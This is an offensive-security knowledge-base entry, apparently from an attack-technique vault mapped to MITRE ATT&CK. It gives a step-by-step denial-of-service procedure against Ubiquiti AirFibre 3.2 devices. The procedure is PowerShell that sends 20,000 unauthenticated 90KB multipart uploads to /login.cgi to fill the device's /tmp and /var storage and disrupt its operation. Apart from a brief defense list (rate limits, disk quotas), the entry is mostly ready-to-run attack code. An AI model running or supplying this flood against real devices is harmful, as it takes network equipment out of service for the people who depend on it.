---
tags:
  - dos
  - disk-exhaustion
  - mass-upload
type: procedure
tools:
  - '[[tools/PowerShell]]'
tactics:
  - '[[Impact]]'
commands:
  - '[[commands/PowerShell-Script-for-Mass-File-Upload-DoS]]'
  - '[[commands/Send-NetworkData-TCP-Function]]'
platforms:
  - Web
  - Embedded Linux
techniques:
  - '[[OS Exhaustion Flood]]'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
id: 26f877aa-20ae-4e78-89f2-3d085cae0cc1
created_at: '2025-12-14T05:32:10.009Z'
updated_at: '2025-12-14T05:32:10.009Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Impact]]'
mitre_techniques:
  - '[[OS Exhaustion Flood]]'
---
# Upload-Multiple-Files-to-Exhaust-Disk-Space

## Summary

This procedure automates the upload of 20,000 large files (90KB each) using unique filenames to the /login.cgi endpoint, exhausting the shared /tmp and /var disk space on Ubiquiti AirFibre 3.2, resulting in DoS.

## Description

Building on the upload vulnerability, this script loops to generate and send POST requests with 'action=upload' and large content ('A' x 90,000), storing files as '1.txt' to '20000.txt' in /tmp/upload. The embedded Linux filesystem fills quickly, impacting services. Requires the Send-NetworkData function and network access; total data ~1.8GB.

## Requirements

1. Verified single upload works
2. PowerShell with Send-NetworkData defined
3. Target IP reachable; sufficient local bandwidth for 20,000 requests

## Defense

Defensive measures and detection strategies:

- Rate-limit uploads and enforce per-IP quotas
- Quota disk space for /tmp and scan for anomalous files
- Log and block repeated POSTs to /login.cgi without auth

## Objectives

1. Flood storage with junk files
2. Achieve partition exhaustion
3. Disrupt device operations

## Instructions

### Step 1: Define Script Variables

**Context**: Set IP, content size, and loop parameters for mass upload.

**Command** ([[commands/PowerShell-Script-for-Mass-File-Upload-DoS]]):
```powershell
$ip = "10.62.148.4"
$content = "A" * 90000
for ($i=1; $i -le 20000; $i++) {
    # POST body generation here
}
```

> Initializes variables. Expected output: Script ready to run.

### Step 2: Execute Loop with Sends

**Context**: Generate POST for each iteration and send via TCP.

**Command** ([[commands/PowerShell-Script-for-Mass-File-Upload-DoS]]):
```powershell
$POST = "POST http://$ip/login.cgi HTTP/1.1`nContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryoA1KFlNlMcwhR9SP`n`n------WebKitFormBoundaryoA1KFlNlMcwhR9SP`nContent-Disposition: form-data; name=\"file\"; filename=\""$i.txt\"`nContent-Type: text/plain`n`n$content`n------WebKitFormBoundaryoA1KFlNlMcwhR9SP`nContent-Disposition: form-data; name=\"action\"`n`nupload`n------WebKitFormBoundaryoA1KFlNlMcwhR9SP--"
echo $POST | Send-NetworkData -Computer $ip -Port 80
```

> Runs in loop using [[commands/Send-NetworkData-TCP-Function]]. Expected output: Accumulated responses showing successes; disk fills.

## MITRE ATT&CK Mapping

### Tactics

- [[Impact]]

### Techniques

- [[OS Exhaustion Flood]]

### Sub-Techniques


## Commands Used

- [[commands/PowerShell-Script-for-Mass-File-Upload-DoS]]
- [[commands/Send-NetworkData-TCP-Function]]

## Tools Used

- [[tools/PowerShell]]

## Tags

- [[dos]]
- [[disk-exhaustion]]
